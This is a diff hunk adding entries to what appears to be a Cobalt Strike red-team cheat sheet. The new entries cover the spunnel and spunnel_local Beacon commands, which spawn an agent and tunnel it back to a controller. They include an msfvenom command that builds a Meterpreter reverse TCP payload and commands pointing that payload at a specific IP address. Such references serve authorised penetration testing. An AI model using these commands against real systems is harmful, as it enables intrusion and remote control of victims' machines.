@@ -390,6 +390,14 @@ beacon > browserpivot [pid] [x86|x64]
 
 # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
 beacon > rportfwd [bind port] [forward host] [forward port]
+
+# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
+beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
+
+# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller
+# then you can handle the connect back on your MSF multi handler
+beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 ```
 
 ## Kits
